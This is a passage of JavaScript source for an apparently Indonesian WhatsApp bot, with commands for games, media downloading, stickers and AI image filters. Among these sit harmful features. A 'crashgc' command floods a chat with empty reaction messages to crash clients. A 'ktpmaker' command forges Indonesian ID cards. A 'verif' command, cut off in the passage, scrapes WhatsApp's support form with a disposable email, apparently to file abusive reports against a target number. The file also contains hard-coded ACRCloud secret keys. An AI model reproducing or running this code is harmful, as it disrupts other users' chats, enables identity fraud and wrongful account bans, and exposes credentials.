	    if (!roof.pilih) conn.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    conn.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete conn.suit[roof.id]
	    }
	    }
	

  
	
	        //TicTacToei

	    conn.tictac = conn.tictac ? conn.tictac : {}
	    let roomf = Object.values(conn.tictac).find(roomf => roomf.id && roomf.tictac && roomf.state && roomf.id.startsWith('tictactoe') && [roomf.tictac.playerX, roomf.tictac.playerO].includes(sender) && roomf.state == 'PLAYING')
	    if (roomf) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(budy)) return
	    isSurrender = !/^[1-9]$/.test(budy)
	    if (sender !== roomf.tictac.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = roomf.tictac.turn(sender === roomf.tictac.playerO, parseInt(budy) - 1))) {
	    setReply ({
	    '-3': '*TICTACTOE TELAH BERAKHIR*',
	    '-2': '*INVALID*',
	    '-1': '*POSISI INVALID*',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (sender === roomf.tictac.winner) isWin = true
	    else if (roomf.tictac.board === 511) isTie = true
	    let arr = roomf.tictac.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    roomf.tictac._currentTurn = sender === roomf.tictac.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? roomf.tictac.currentTurn : roomf.tictac.winner
	    let str = `*TICTACTOE*

 ID: ${roomf.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} *MENANG!*` : isTie ? `*HASIL SERI*` : `Giliran ${['❌', '⭕'][1 * roomf.tictac._currentTurn]} (@${roomf.tictac.currentTurn.split('@')[0]})`}
❌: @${roomf.tictac.playerX.split('@')[0]}
⭕: @${roomf.tictac.playerO.split('@')[0]}

`
	    if ((roomf.tictac._currentTurn ^ isSurrender ? roomf.x : roomf.o) !== m.chat)
	    roomf[roomf.tictac._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (roomf.x !== roomf.o)  conn.sendText(roomf.x, str, m, { mentions: parseMention(str) } )
	     conn.sendText(roomf.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete conn.tictac[roomf.id]
	    }
      }
	async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const { default: { Image }} = await import('node-webpmux')
	const img = new Image()
	const json = { 'sticker-pack-id': 'parel-kntll', 'sticker-pack-name': packname, 'sticker-pack-publisher': author, 'emojis': categories, 'is-avatar-sticker': 1, ...extra }
	let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
	let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
	let exif = Buffer.concat([exifAttr, jsonBuffer])
	exif.writeUIntLE(jsonBuffer.length, 14, 4)
	await img.load(buffer)
	 img.exif = exif
	return await img.save(null)
}


 /* 	
//SIMI SIMI PRIVATE	
if(!roomChat){
if(isPremium){
if (!isGroup && !dev.key.fromMe && !isImage && !isSticker && !isCmd ) {
try{
//conn.sendPresenceUpdate('composing', from) 

// Array kata-kata random
var kataKata = [
  'Halo',
  'Apa kabar?',
  'Selamat pagi',
  'Selamat siang',
  'Selamat malam',
  'Bagaimana hari Anda?',
  'Ada yang bisa saya bantu?',
  'Ceritakan lebih lanjut',
  'Saya ingin tahu',
  'Hebat!',
  'Terima kasih',
  'Baiklah',
  'Hahaha',
  'Ayo kita berbicara',
  'Sudah makan?',
  'Apakah Anda suka musik?',
  'Penasaran',
  'Coba lagi',
  'Saya senang berbicara dengan Anda',
  'Sampai jumpa',
  'Aku SimSimi, siapa namamu?',
  'Bicaralah padaku!',
  'Aku senang berbicara denganmu.',
  'Ada yang bisa kukerjakan untukmu?',
  'Ceritakan padaku tentang hari ini.',
  'Kamu punya pertanyaan?',
  'Aku suka menjadi temanmu.',
  'Bagaimana perasaanmu hari ini?',
  'Aku ingin tahu lebih banyak tentangmu.',
  'Kamu punya hobi apa?',
  'Ceritakan padaku impianmu!',
  'Kapan terakhir kali kamu tertawa?',
  'Jika kamu bisa melakukan satu hal, apa yang kamu inginkan?',
  'Apakah kamu ingin mendengarkan sebuah cerita?',
  'Kamu adalah teman yang baik.',
  'Apakah ada yang bisa aku bantu?',
  'Apa rencanamu untuk akhir pekan?',
  'Terima kasih telah berbicara dengan SimSimi!'
];
function kataKataRandom() {
  var randomIndex = Math.floor(Math.random() * kataKata.length);
  return kataKata[randomIndex];
}
var kataAcak = kataKataRandom();

//let gakm = (await axios("https://simsimi.vn/web/simtalk", { method: "post", data: "lc=id&text="+encodeURIComponent(budy) })).data
let simi = await axios.get(`https://api.simsimi.net/v2/?text=${encodeURIComponent(body)}&lc=id`, {method: "GET"})
let sim = simi.data.success
if(sim.includes('Aku tidak mengerti apa yang kamu katakan')) return conn.sendMessage(from, {text: kataAcak}, {quoted: fsimi})
conn.sendMessage(from, {text: sim}, {quoted: fsimi})
} catch (err) {
return
} 
}
}
}
*/
  

/*
//Deteksi user di gc
if(!isPremium){
if(!isGroup){
let userr = await conn.groupMetadata(`120363041984430206@g.us`)
let ppgb = await conn.profilePictureUrl(userr.id, 'image')
let buff = await getBuffer (ppgb)

let mem = []
 userr.participants.map(i => mem.push(i.id))

if(!mem.includes(sender)) return conn.sendMessage(from, {
text: "Silahkan Join Grup Bot Agar Bisa Menggunakan Bot Di Pesan Pribadi",
contextInfo:{
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": 'Klik Disini',
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": buff,
"mediaUrl": "https://chat.whatsapp.com/DaBXFf82aqwHc03v22E09D",
"sourceUrl": "https://chat.whatsapp.com/DaBXFf82aqwHc03v22E09D"
}
}
}, {quoted:dev}) 
}
}
  */


  
  
// ==========================================================\\
try{
switch(command) {




		

case 'listwamod':
case 'wamod':{
reply (mess.wait)
const { mods } = require('fouadwa-scraper')
let mod = await mods()
let res = Object.values(mod)
let teks = "*List WhatsApp Mod*\n\n"
for(var i of res){
	teks += `*𖦹 Nama :* ${i.name}\n`
    teks += `*𖦹 Link :* ${i.link}\n\n` 
  }
  reply(teks)
}
break

    

case 'anonfile':{
if(isAllMedia || isQuotedImage || isQuotedVideo || isQuotedSticker || isQuotedAudio){
	const anonfile = require('anonfile-lib')
	let filename = q ? q : 'AnonFiles-'+Math.floor(Math.random() * 999999999)
	let media = await conn.downloadAndSaveMediaMessage(quoted, filename)
let info = await anonfile.upload(media)
if(info.status !== true) setReply( `GAGAL`)
 let {data} = await axios.get(info.data.file.url.short)
const $ = require("cheerio").load(data)
const panjang = $("body").find("#download-url").attr("href")
	let response = `*───「 ANONFILES UPLOADER 」───*
	Sukses Mengunggah File
	
	Nama File : ${info.data.file.metadata.name}
	Ukuran File : ${info.data.file.metadata.size.readable}
	Link : ${panjang}
	Short : ${info.data.file.url.short}
	`
	 await setReply(response)
	 await  fs.unlinkSync(media)
  } else {
	setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio/sticker/audio yang sudah dikirim!`)
}
	 }
	 break

    /*

case 'play':
	 try{
    if(!q) return reply(`Example: ${prefix+command} dj tutu`)
	if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
	 if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio")
	reply(mess.wait)
	let anu = await yts(q)
	let teks =`*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
⏲️ Duration : ${anu.all[0].timestamp}
🌎 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}


*Note:*
Balas/reply pesan ini dengan huruf pilihan:
  a: Audio (mengambil audio nya)
  v: Video (mengambil video nya)
	`
let inithumb = await getBuffer(anu.all[0].image)
conn.sendMessage(from, { contextInfo: { mentionedJid: [sender],
externalAdReply: {
title: `${anu.all[0].title}`,
body: `   ━━━━⬤──────────    click here to play music `,
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: inithumb, 
mediaUrl: `${anu.all[0].url}`,
sourceUrl: `${anu.all[0].url}`
}
}, text: teks}, {quoted: dev})
	  } catch(err){
	setReply(`${err}`)
	}
	db.data.users[sender].limit -= 1 // -1 limit
	break 

*/
   

    
  case 'animeterbaru': case 'animeupdate':{
let res = await fetchJson (`https://xzn.wtf/api/oploverz/ongoing?apikey=${apiwtf}`)
let tekss = `*========[ ANIME UPDATE ]========*\n`
for (var i of res){
tekss +=`
𖦹 *Judul:* ${i.title}
𖦹 *Episode:* ${i.episode}
𖦹 *Type:* ${i.type}
𖦹 *Score:* ${i.score}
𖦹 *Poster:* ${i.poster}
𖦹 *Link:* ${i.link}
𖦹 *Status:* ${ i.status}
𖦹 *PostBy:* ${i.posted_by}
𖦹 *Rilis:* ${i.released_on}
𖦹 *Series:* ${i.series}\n•------------------------------------------------•\n`}
conn.sendMessage(from, {caption: tekss, image:{url: res[0].poster}}, {quoted:m})
}
break

    
case 'ttsearch':{
try{
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(!q) return reply (`Mau cari apa??\nCara penggunaan: ${prefix+command} judul|jumlah\n\nContoh: ${prefix+command} taubat|3`)
reply(mess.wait)
let body = q.replace(/\s+/g, '+')
let [t1, t2] = body.split`|`
const data = await fetchJson ('https://xzn.wtf/api/ttsearch?apikey=${apiwtf}&count=' + t2 + '&search=' + t1)

  if(q.includes('|')){
for ( let i of data) {
 await sleep(3000)
conn.sendMessage(from, {video: {url: i.play}, caption: i.title}, {quoted:m})
} 
} else {
conn.sendMessage(from, {video: {url: data[0].play}, caption: data[0].title}, {quoted:m})
}
} catch (e){
console.log(e)
reply ('Maaf video tidak di temukan coba judul lain')
}
db.data.users[sender].limit -= 1 // -1 limit
}
break

case 'anime2d':
case 'cartoon_3d': 
case 'pretty_soldier':
case 'bizarre':
case 'romance_comic':
case 'maid_dressing':
case 'superhero_comic':
case 'watercolor':
case 'doodle':
case 'america_comic':
case 'starry_girl': {
  try{
 if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(isAllMedia || isQuotedImage || isQuotedSticker){  
  setReply("Sedang di proses, tunggu 1-2 menit...")
let media = await conn.downloadAndSaveMediaMessage(quoted)
let url = await uploadFile (media)
let data = await fetchJson (`https://xzn.wtf/api/aimirror?&apikey=${apiwtf}&url=${url}&filter=${command}`)
conn.sendMedia(from, data.generated_image_addresses[0], dev)
await fs.unlinkSync(media)
} else {
  setReply(`Kirim gambar dengan caption ${prefix+command} atau reply gambar/sticker`)
       }
  } catch (e){
    console.log(e)
    reply('Maaf foto kurang jelas, coba foto lain')
  }
}
db.data.users[sender].limit -= 1 // -1 limit
break



case 'jadianime':
case 'toanime': {
  try{
 if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(isAllMedia || isQuotedImage || isQuotedSticker){  
  setReply("Sedang di proses, tunggu 1-2 menit...")
let media = await conn.downloadAndSaveMediaMessage(quoted)
let url = await uploadFile (media)
let data = await fetchJson (`https://xzn.wtf/api/aimirror?&apikey=${apiwtf}&url=${url}&filter=anime2d`)
conn.sendMedia(from, data.generated_image_addresses[0], dev)
await fs.unlinkSync(media)
} else {
  setReply(`Kirim gambar dengan caption ${prefix+command} atau reply gambar/sticker`)
       }
  } catch (e){
    console.log(e)
    reply('Maaf foto kurang jelas, coba foto lain')
  }
}
db.data.users[sender].limit -= 1 // -1 limit
break


   case 'carimusik': case 'whatmusic':{
    if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
	const acrcloud = require("acrcloud");
	const acr = new acrcloud({
	host: "identify-eu-west-1.acrcloud.com",
	access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
	access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
	});
	if (isQuotedAudio || isAudio) {
	setReply("Silahkan tunggu beberapa menit...")
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} ${ran}`, (err) => {
	fs.unlinkSync(media)
	if (err) return setReply('Gagal mengkonversi audio ke ptt')
	let sample = fs.readFileSync(ran)
	acr.identify(sample).then(async metadata => {
    console.log(metadata)
  if(metadata.status.code == "3016") return reply('file yang Anda upload terlalu besar, kami sarankan Anda memotong file besar menjadi file yang lebih kecil 10-20 detik data audio cukup untuk mengidentifikasi')
	if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
	var res = metadata.metadata.music[0]
	let rus = await yts(res.title)
	if(rus.all.length == "0") return setReply("Video tidak bisa di download")
	let ras = await rus.all.filter(v => v.type == 'video')
	let info = await ytdl.getInfo(ras[0].url);
	let audio = ytdl.filterFormats(info.formats, 'audioonly');
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	let videoID = ras[0].videoId
	
	try{
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
	} catch(err) {
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
	}
	let yamyam = await getBuffer(`${thumbnya}`)
	
	let teks = `
	*RESULT FOUND* 💽
	
	📂 Title: ${res.title}
	👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
	💾 Album: ${res.album.name || ''}
	🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
	🌏 Release Date: ${res.release_date}
	⏳ Durasi : ${ras[0].timestamp}
	🎧 Audio : ${FileSize(audio[0].contentLength)}
	🎬 Video : ${FileSize(format.contentLength)}
	🖇️ Link: ${ras[0].url}
	`
	conn.sendMessage(from, {caption: teks, image: yamyam}, {quoted:m})
	downloadMp3 (ras[0].url)
	});
	fs.unlinkSync(ran)
	})
	} else if (isVideo || isQuotedVideo) {
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
	fs.unlinkSync(media)
	if (err) return setReply(`Err: ${err}`)
	let sample = fs.readFileSync(ran)
	acr.identify(sample).then(async metadata => {
  if(metadata.status.code == "3016") return reply ("file yang Anda upload terlalu besar, kami sarankan Anda memotong file besar menjadi file yang lebih kecil 10-20 detik data audio cukup untuk mengidentifikasi")
	if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
	var res = metadata.metadata.music[0]
	let rus = await yts(res.title)
	if(rus.all.length == "0") return setReply("Video tidak bisa di download")
	let ras = await rus.all.filter(v => v.type == 'video')
	let info = await ytdl.getInfo(ras[0].url);
	let audio = ytdl.filterFormats(info.formats, 'audioonly');
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	let videoID = ras[0].videoId
	
	try{
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
	} catch(err) {
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
	}
	let yamyam = await getBuffer(`${thumbnya}`)
	
	let teks = `
	*RESULT FOUND* 💽
	
	📂 Title: ${res.title}
	👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
	💾 Album: ${res.album.name || ''}
	🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
	🌏 Release Date: ${res.release_date}
	⏳ Durasi : ${ras[0].timestamp}
	🎧 Audio : ${FileSize(audio[0].contentLength)}
	🎬 Video : ${FileSize(format.contentLength)}
	🖇️ Link: ${ras[0].url}
	`
	conn.sendMessage(from, {caption: teks, image: yamyam}, {quoted:m})
	downloadMp3 (ras[0].url)
	});
	fs.unlinkSync(ran)
	 })
	 } else {
	setReply("Reply audio atau video")
	}
	}
	db.data.users[sender].limit -= 1 // -1 limit
	break
	

    
  



case 'dalle':{
try{
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(!q) return reply(`Invalid teks!!\n\nContoh: ${prefix+command} rumah hantu`)
reply(mess.wait)
conn.sendMessage(from, {image: {url: `https://api.lolhuman.xyz/api/dall-e?apikey=${keylol}&text=${q}`}, caption: 'Nih '}, {quoted: dev})
} catch (e){
console.log(e)
reply('Erorr')
return 
}
}
db.data.users[sender].limit -= 1 // -1 limit
break

  case 'cekresi':{
    try{
    if(!q) return reply(`Invalid res!!\n\nContoh: ${prefix+command} resesi paketmu`)
reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/checkresi?apikey=${keylol}&resi=${args[0]}`).then(({ data }) => {
				let text = `Nomor Resi : ${data.result.resi}\n`
				text += `Kurir : ${data.result.courier?.toUpperCase()}\n`
				text += `Dari : ${data.result.origin.name}\n`
				text += `Tujuan : ${data.result.destination.name}\n\n`
				for (let x of data.result.history) {
					text += `Deskripsi : ${x.note}\n`
					text += `Waktu : ${x.time}\n\n`
				}
				 reply(text)
			})
  } catch (e){
console.log(e)
reply('Erorr')
return 
}
  }
			break

case 'smeme': {
if(!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
var bottom = q.split('|')[0] ? q.split('|')[0] : ''
if (isQuotedImage || isImage || isQuotedSticker ) {
setReply(mess.wait)
if (q.includes('|')) {
var value = args.join(' ')
var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let info = await anonfile.upload(olalah)
let {data} = await axios.get(info.data.file.url.short)
const $ = require("cheerio").load(data)
const anuah = $("body").find("#download-url").attr("href")
let media = `https://api.memegen.link/images/custom/${encodeURIComponent(teks1)}/${encodeURIComponent(teks2)}.png?background=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)
}  else {
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let info = await anonfile.upload(olalah)
let {data} = await axios.get(info.data.file.url.short)
const $ = require("cheerio").load(data)
const anuah = $("body").find("#download-url").attr("href")
let media = `https://api.memegen.link/images/custom/-/${encodeURIComponent(bottom)}.png?background=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)
} 
} else {
	setReply(`Kirim gambar dengan caption ${command} halo atau balas gambar/sticker yang sudah dikirim!`)
}
}
break    

		
case 'qchitam':{
	if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
	try{
const sender = (dev.quoted?.text ? dev.quoted : dev).sender
const name = await conn.getName(sender)
let teks = m.quoted ? m.quoted.text : q ? q : ""
const avatar = await conn.profilePictureUrl(sender, "image").catch(_ => "https://telegra.ph/file/89c1638d9620584e6e140.png") 
if(isImage || isQuotedImage || isQuotedSticker){  
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let anu = await uploadFile (media)
const json = { type: "quote", format: "png", backgroundColor: "#1b1e23", width: 512, height: 768,  scale: 2, messages: [{ entities: [], media: { url: anu }, avatar: true, from: { id: 1, name, photo: { url: avatar }}, text: `${teks}`, replyMessage: {} }]}
 const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
    headers: {
      "Content-Type": "application/json"
    }
  }).catch(e => e.response || {})
  if(!data.ok) throw data
const buffer = Buffer.from(data.result.image, "base64")
makeSticker(buffer,Sticker, StickerTypes)
} else {
const json = { type: "quote", format: "png", backgroundColor: "#202c33", width: 512, height: 768,  scale: 2, messages: [{ entities: [], avatar: true, from: { id: 1, name, photo: { url: avatar }}, text: `${teks}`, replyMessage: {} }]}
const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
    headers: {
      "Content-Type": "application/json"
    }
  }).catch(e => e.response || {})
  if(!data.ok) reply( data)
const buffer = Buffer.from(data.result.image, "base64")
makeSticker(buffer,Sticker, StickerTypes)
await fs.unlinkSync(media)
}
} catch (e){
    console.log(e)
	setReply ('System erorr coba lgi')
	return
	}
}
db.data.users[sender].limit -= 1 // -1 limit
break


case 'crashgc': case 'fc':{
  if(!isOwner) return reply (mess.only.owner)
 let baileys = require ("@adiwajshing/baileys")
let reactionMessage = baileys.proto.Message.ReactionMessage.create({ key: m.key, text: "" })
setInterval(async() => {
 await conn.relayMessage(from, { reactionMessage }, { messageId: "ppppp" })
}, 1000)
}
break



case 'pemilik': case 'owner':{
conn.sendContactV2(from, global.nomerOwner, m)
            }
            break
	     
case 'jadizombie':{
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(isImage || isQuotedImage || isQuotedSticker){  
  reply(mess.wait)
const makemeazombie = require('makemeazombie');
const zombie = new makemeazombie();
let media = await conn.downloadAndSaveMediaMessage(quoted)
let anu = await uploadFile (media)
zombie.transform({
    photo: anu, 
    // To save the image to a specific path
    destinyFolder: '.'
})
.then(data => {
    conn.sendMedia(from, data, dev)
})
} else {
  setReply(`Kirim gambar dengan caption ${prefix+command} atau reply gambar/sticker`)
       } 
//await fs.unlinkSync(media)
}
db.data.users[sender].limit -= 1 // -1 limit
break

case 'capcutaudio': case 'capcutmusik':{
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(!q) return reply(`Invalid link!!\nContoh: ${prefix+command} https://www.capcut.com/watch/7237430664168033538?use_new_ui=1&template_id=7237430664168033538&share_token=20ef5ba6-606f-405c-bd1e-e46bfcb1bb13&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1`)
reply(mess.wait)
async function capcut() {
var $ = await cheerio.load(await (await axios(arguments[0])).data);
return {
nama: $("img").attr("alt"),
used: $("b").text().replace($("img").attr("alt"), ""),
thumbnail: $("img").attr("src"),
video: $("video").attr("src"),
};
}
let data = await capcut (q)
let caption = `*CAPCUT DOWNLOADER*

𖦹 Nama: ${data.nama}
𖦹 Pemakai: ${data.used}

_© ${global.botName}_`
let buffer = await getBuffer (data.video)
let audio = await toAudio(buffer, 'mp4')
reply(caption)
await conn.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
db.data.users[sender].limit -= 1 // -1 limit
break

case 'capcut': case 'capcutdl':{
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(!q) return reply(`Invalid link!!\nContoh: ${prefix+command} https://www.capcut.com/watch/7237430664168033538?use_new_ui=1&template_id=7237430664168033538&share_token=20ef5ba6-606f-405c-bd1e-e46bfcb1bb13&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1`)
reply(mess.wait)

const data = await capcutdl (q)
let caption = `*CAPCUT DOWNLOADER*

*𖦹 Title:* ${data.title}
*𖦹 Deskripsi:* ${data.description}
*𖦹 Pemakai:* ${data.usage}

_© ${global.botName}_`
await conn.sendMessage(from, {video: {url: data.originalVideoUrl}, caption: caption}, {quoted: m})
}
db.data.users[sender].limit -= 1 // -1 limit
break

case 'ai':
case 'openai':{
	try{
if(!q) return setReply("Teksnya mana om")
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
let data = await fetchJson (`https://xzn.wtf/api/openai?text=${q}&apikey=${apiwtf}`)
let tex = `${data.result}`
let modif = tex.replace("_powered by: https://xzn.wtf_")
reply(`${modif}`) 

} catch (e){
reply ('sedang erorr, cba lagi nanti')
	}
}
db.data.users[sender].limit -= 1 // -1 limit
break


case  'setimgmenu':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/menu.jpeg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah thumbnail`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix}setimgmenu`);
	}
	}
	break
  
    
case  'menu': case 'help': {
let { allmenu, fitur} = require('./help')
let menunya = allmenu(limitCount, isPremium,thisHit, publik, sender, prefix, pushname)
let fiturnya = fitur()
conn.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `ElainaMD`,
body:`DanuSitepu`,
previewType:"PHOTO", 
thumbnail: fs.readFileSync('./stik/menu.jpeg'),
sourceUrl:`https://canvas.danukiding.my.id`
}}, image: fs.readFileSync('./stik/menu.jpeg'), text: menunya+fiturnya}, { quoted: dev })
}
break 

 

case 'totag': {
               if (!isGroup) return reply(mess.group)
               if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
               const participants = isGroup ? await groupMetadata.participants : ''
               if (!m.quoted) return reply( `Reply pesan dengan caption ${prefix + command}`)
               conn.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break



 
case 'ktpmaker': {
if (args.length == 0) return reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
reply(mess.wait)
let get_args = args.join(" ").split("|")
let nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
let prov = get_args[1]
if (!prov) return m.reply('provinsi mana kak')
let kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
let name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
let ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
let jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
let jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
let rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
let lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
let camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
let agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
let nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
let kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
let warga = get_args[13]
if (!warga) return m.reply('region belum ada')
let until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
let gd = get_args[15]
if (!gd) return m.reply('golongan darah belum ada')
let img = get_args[16]
if (!img) return m.reply('url image belum ada')      
let bikin = `https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`
 conn.sendMessage(from, { image: {url: bikin}, caption: `done kak` }, { quoted: dev })
}
break

 case 'verif':{
    try{
if (!isOwner) return reply(mess.owner)
  let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
console.log(Pe)
if(!Pe ) return setReply("Masukan nomer target")
await setReply("Proses...")
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
